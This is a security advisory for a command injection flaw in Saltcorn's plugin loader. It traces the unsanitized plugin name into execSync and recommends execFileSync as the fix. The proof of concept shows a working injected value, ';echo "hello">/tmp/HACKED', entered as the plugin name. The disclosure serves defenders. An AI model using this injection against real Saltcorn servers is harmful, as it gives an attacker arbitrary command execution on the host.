# [H] @saltcorn/plugins-loader unsanitized plugin name leads to a remote code execution (RCE) vulnerability when creating plugins using git source

## Summary
Severity: High
Advisory: GHSA-fm76-w8jw-xf8m
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-10-03
Source: https://github.com/advisories/GHSA-fm76-w8jw-xf8m
Type: github-advisory

## Affected
- npm: `@saltcorn/plugins-loader` — affected >=0 <1.0.0-beta.14

## Details
### Summary

When creating a new plugin using the `git` source, the user-controlled value `req.body.name` is used to build the plugin directory where the location will be cloned. The API used to execute the `git clone` command with the user-controlled data is `child_process.execSync`. Since the user-controlled data is not validated, a user with admin permission can add escaping characters and execute arbitrary commands, leading to a command injection vulnerability.

### Details

Relevant code from source (`req.body`) to sink (`child_process.execSync`).

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400

```js
router.post(
  "/",
  isAdmin,
  error_catcher(async (req, res) => {
    const plugin = new Plugin(req.body); // [1] 
      [...]
      try {
        await load_plugins.loadAndSaveNewPlugin( // [3] 
          plugin,
          schema === db.connectObj.default_schema || plugin.source === "github"
        );
        [...]
    }
  })
);
```

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44
```js
class Plugin {
  [...]
  constructor(o: PluginCfg | PluginPack | Plugin) {
    [...]
    this.name = o.name; // [2] 
    [...]
}
```

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65
```js
const loadAndSaveNewPlugin = async (plugin, force, noSignalOrDB) => {
  [...]
  const loader = new PluginInstaller(plugin); // [4] 
  const res = await loader.install(force); // [7] 
  [...]
};
```

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61
```js
class PluginInstaller {
  constructor(plugin, opts = {}) {
    [...]
    const tokens =
      plugin.source === "npm"
        ? plugin.location.split("/")
        : plugin.name.split("/"); // [5] 
    [...]
    this.tempDir = join(this.tempRootFolder, "temp_install", ...tokens); // [6] 
    [...]
  }

  
  async install(force) {
    [...]
    if (await this.prepPluginsFolder(force, pckJSON)) { // [8] 
    [...]
  }

  async prepPluginsFolder(force, pckJSON) {
    [...]
    switch (this.plugin.source) {
      [...]
      case "git":
        if (force || !(await pathExists(this.pluginDir))) { 
          await gitPullOrClone(this.plugin, this.tempDir); // [9] 
	  [...]
  }
```

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112
```js
const gitPullOrClone = async (plugin, pluginDir) => {
  [...]
  if (fs.existsSync(pluginDir)) {
    execSync(`git ${setKey} -C ${pluginDir} pull`);
  } else {
    execSync(`git ${setKey} clone ${plugin.location} ${pluginDir}`); // [10] 
  }
  [...]
};
```

### PoC

- check that the file will be created by the command `echo "hello">/tmp/HACKED` does not exists:
```
cat /tmp/HACKED
cat: /tmp/HACKED: No such file or directory
```
- login with an admin account
- visit `http://localhost:3000/plugins/new`
- enter the following fields:
	- Name: `;echo "hello">/tmp/HACKED`
	- Source: `git`
	- other fields blank
- click `Create`
- you will get an error saying `ENOENT: no such file or directory,  ....` but the command `touch /tmp/HACKED` will be executed
- to verify:
```
cat /tmp/HACKED
hello
```

### Impact

Remote code execution

### Recommended Mitigation

Sanitize the `pluginDir` value before passing to `execSync`. Alternatively, use `child_process. execFileSync` API (docs: https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options)

## References
- https://github.com/saltcorn/saltcorn/security/advisories/GHSA-fm76-w8jw-xf8m
- https://github.com/saltcorn/saltcorn/commit/024f19a7e079913f62f4a2335ab04116ddb68192
- https://github.com/saltcorn/saltcorn
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/download_utils.js#L112
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L41-L61
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/saltcorn-data/models/plugin.ts#L44
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/load_plugins.js#L64-L65
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/plugins.js#L1400
